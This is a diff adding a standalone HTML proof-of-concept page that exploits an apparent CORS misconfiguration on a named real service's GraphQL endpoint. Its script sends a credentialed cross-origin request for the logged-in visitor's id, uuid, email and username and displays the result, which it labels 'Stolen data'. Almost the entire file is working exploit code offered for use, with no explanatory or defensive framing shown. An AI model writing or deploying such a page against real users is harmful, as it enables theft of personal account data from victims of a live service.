@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit CORS Misconfiguration</title>
+    <script>
+        window.onload = function() {
+            // Add event listener for button click
+            document.getElementById('exploitButton').addEventListener('click', function() {
+                // Create the request to exploit CORS misconfig
+                fetch('https://graph.linktr.ee/graphql', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        // Add Authorization header if needed
+                        // 'Authorization': 'Bearer YOUR_VICTIM_TOKEN', // Uncomment if you have a token
+                    },
+                    body: JSON.stringify({
+                        query: `
+                            {
+                                currentUser {
+                                    id
+                                    uuid
+                                    email
+                                    username
+                                }
+                            }
+                        `
+                    }),
+                    credentials: 'include'  // Ensure that cookies or session data are included if necessary
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // If data is returned successfully, show the data
+                    if (data && data.data) {
+                        console.log("Stolen data:", data.data.currentUser);
+                        alert("Data retrieved: " + JSON.stringify(data.data.currentUser, null, 2));
+                    } else {
+                        alert("Failed to retrieve data, CORS misconfiguration might not exist.");
+                    }
+                })
+                .catch(err => {
+                    console.error("Error:", err);
+                    alert("Error occurred: " + err.message);
+                });
+            });
+        };
+    </script>
+</head>
+<body>
+    <h1>CORS Misconfiguration Exploit</h1>
+    <p>Click the button to exploit the CORS misconfiguration and attempt to retrieve user data.</p>
+    <button id="exploitButton">Exploit CORS Misconfiguration</button>
+</body>
+</html>
